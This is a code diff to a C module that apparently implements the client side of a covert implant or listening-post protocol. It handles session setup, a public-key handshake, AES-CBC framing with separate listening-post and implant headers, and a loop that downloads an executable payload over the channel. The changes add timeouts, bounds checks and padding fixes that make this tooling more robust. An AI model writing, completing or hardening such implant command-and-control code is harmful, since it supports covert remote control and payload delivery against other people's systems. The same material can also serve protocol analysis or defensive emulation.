@@ -29,6 +29,8 @@ int pc_session_init(pc_session_t *s, const char *ip, u16 port, const char *hdr)
     s->lp_port = port;
     strncpy(s->hdr_name, hdr ? hdr : "TlEo", sizeof(s->hdr_name) - 1);
     s->sock = PC_INVALID_SOCK;
+    s->timeout_ms = 10000;
+    s->sub_msg = 0;
     return EQ_OK;
 }
 
@@ -40,6 +42,22 @@ static int pc_sendall(pc_sock_t fd, const u8 *buf, size_t len)
         if (n <= 0) return EQ_ERR_IO;
         sent += (size_t)n;
     }
+    return EQ_OK;
+}
+
+static int pc_set_timeouts(pc_sock_t fd, u32 ms)
+{
+#ifdef _WIN32
+    DWORD t = (DWORD)ms;
+    if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&t, sizeof t) != 0) return EQ_ERR_IO;
+    if (setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, (const char *)&t, sizeof t) != 0) return EQ_ERR_IO;
+#else
+    struct timeval tv;
+    tv.tv_sec  = (time_t)(ms / 1000);
+    tv.tv_usec = (suseconds_t)((ms % 1000) * 1000);
+    if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv) != 0) return EQ_ERR_IO;
+    if (setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof tv) != 0) return EQ_ERR_IO;
+#endif
     return EQ_OK;
 }
 
@@ -56,7 +74,11 @@ int pc_reconnect(pc_session_t *s)
     if (connect(s->sock, (struct sockaddr *)&a, sizeof(a)) != 0) {
         PC_CLOSE(s->sock); s->sock = PC_INVALID_SOCK; return EQ_ERR_IO;
     }
+    if (pc_set_timeouts(s->sock, s->timeout_ms) != EQ_OK) {
+        PC_CLOSE(s->sock); s->sock = PC_INVALID_SOCK; return EQ_ERR_IO;
+    }
     s->connid = ++s->conn_counter;
+    s->sub_msg = 0;
     return EQ_OK;
 }
 
@@ -83,14 +105,18 @@ int pc_send(pc_session_t *s, const u8 *payload, u32 len)
     u32 ct_len, pad, body_len;
     int hn, rc;
 
+    if (len > PC_MAX_BODY - PC_BLOCK) return EQ_ERR_ARG;
     if (pc_reconnect(s) != EQ_OK) return EQ_ERR_IO;
 
     if (s->crypto_on) {
         aes_ctx c;
-        pad = PC_BLOCK - (len % PC_BLOCK);
+        pad = PC_BLOCK - (len % PC_BLOCK);       /* always >= 1: full block when aligned */
         ct_len = len + pad;
+        memset(s->ptbuf, 0, ct_len);
+        if (len) memcpy(s->ptbuf, payload, len);
         aes128_init(&c, s->session_key);
-        aes128_cbc_encrypt(&c, s->iv, payload, len, ct);
+        rc = aes128_cbc_encrypt(&c, s->iv, s->ptbuf, ct_len, ct);
+        if (rc != EQ_OK) return rc;
     } else {
         pad = 0; ct_len = len;
         if (len) memcpy(ct, payload, len);
@@ -128,24 +154,55 @@ int pc_recv(pc_session_t *s, u8 *out, u32 cap, u32 *out_len)
 {
     u8 hdr[PC_HDR_LP], tmp[PC_MAX_BODY];
     u32 clear, length2, plen;
+    size_t hlen = (s->sub_msg == 0) ? PC_HDR_LP : PC_HDR_IMPLANT;
+    int encr;
 
-    if (pc_recvall(s->sock, hdr, sizeof hdr) != EQ_OK) return EQ_ERR_IO;
-    clear = eq_get_be32(hdr + 8);
-    length2 = hdr[12];
+    if (pc_recvall(s->sock, hdr, (u32)hlen) != EQ_OK) return EQ_ERR_IO;
+
+    if (hlen == PC_HDR_LP) {
+        clear = eq_get_be32(hdr + 8);
+        length2 = hdr[12];
+        encr = hdr[13];
+        s->lp_seq = eq_get_le32(hdr + 4);
+    } else {
+        clear = eq_get_be32(hdr + 0);
+        length2 = hdr[4];
+        encr = hdr[5];
+    }
+
     plen = clear + length2;
-    if (plen > sizeof(tmp) || plen > cap) return EQ_ERR_ARG;
-
+    if (plen > sizeof tmp || plen > cap) return EQ_ERR_ARG;
+    if (encr && (plen % PC_BLOCK)) return EQ_ERR_ARG;
     if (plen && pc_recvall(s->sock, tmp, plen) != EQ_OK) return EQ_ERR_IO;
 
-    if (hdr[13] && s->crypto_on) {
+    if (encr && s->crypto_on) {
         aes_ctx c;
         aes128_init(&c, s->session_key);
-        aes128_cbc_decrypt(&c, s->iv, tmp, plen, out);
+        if (aes128_cbc_decrypt(&c, s->iv, tmp, plen, out) != EQ_OK) return EQ_ERR_CRYPTO;
     } else if (plen) {
         memcpy(out, tmp, plen);
     }
+
     *out_len = clear;
+    s->sub_msg++;
     return EQ_OK;
+}
+
+static int pc_recv_exe(pc_session_t *s, u8 *out, size_t cap, size_t *total)
+{
+    u8 buf[PC_MAX_BODY];
+    u32 n;
+    int i;
+    for (i = 0; i < 4096; i++) {
+        if (pc_recv(s, buf, sizeof buf, &n) != EQ_OK) return EQ_ERR_IO;
+        if (n == 0) return EQ_OK;
+        if (out) {
+            if (*total + n > cap) return EQ_ERR_ARG;
+            memcpy(out + *total, buf, n);
+            *total += n;
+        }
+    }
+    return EQ_ERR_IO;
 }
 
 static void pc_random(u8 *out, size_t len)
@@ -241,14 +298,8 @@ int pc_handshake(pc_session_t *s, const u8 *pubkey, size_t pubkey_len,
             if (pc_send(s, (const u8 *)"\0\0\0\0", 4) != EQ_OK) return EQ_ERR_IO;
             status = 11; break;
         case 11:
-            if (pc_recv(s, buf, sizeof buf, &n) != EQ_OK) return EQ_ERR_IO;
-            if (exe_out && total + n <= exe_cap) { memcpy(exe_out + total, buf, n); total += n; }
-            status = (n >= 0x2000) ? 12 : 13; break;
-        case 12:
-            if (pc_recv(s, buf, sizeof buf, &n) != EQ_OK) return EQ_ERR_IO;
-            if (n == 0) { status = 13; break; }
-            if (exe_out && total + n <= exe_cap) { memcpy(exe_out + total, buf, n); total += n; }
-            break;
+            if (pc_recv_exe(s, exe_out, exe_cap, &total) != EQ_OK) return EQ_ERR_IO;
+            status = 14; break;
         default:
             status = 14; break;
         }
